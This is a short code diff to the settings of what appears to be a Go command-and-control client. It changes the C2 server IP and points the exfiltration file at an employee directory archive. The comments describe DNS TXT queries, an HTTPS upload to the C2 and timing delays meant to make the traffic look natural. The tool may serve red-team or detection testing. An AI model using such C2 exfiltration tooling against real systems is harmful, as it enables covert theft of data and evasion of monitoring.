@@ -44,7 +44,7 @@ var (
 	//   - HTTPS connection
 	//   - TXT queries (always direct)
 	//   - A queries (when DirectMode=true)
-	C2ServerIP = "172.208.51.75"
+	C2ServerIP = "48.217.188.16"
 
 	// DirectMode controls A record query routing:
 	//   true  = A queries go directly to C2 (for testing)
@@ -69,8 +69,7 @@ var (
 	HTTPSPort = 8443
 
 	// ExfilFilePath is the file to upload to the C2 after TXT transfer.
-	// Should be ~200MB for realistic exfiltration traffic.
-	ExfilFilePath = `C:\Users\tresa\OneDrive\Desktop\example.pcapng`
+	ExfilFilePath = `C:\Users\tresa\OneDrive\Desktop\employees_dir.zip`
 
 	// TXTQueryDelayMs is the delay between TXT queries (milliseconds).
 	// A small delay makes the traffic look more natural.
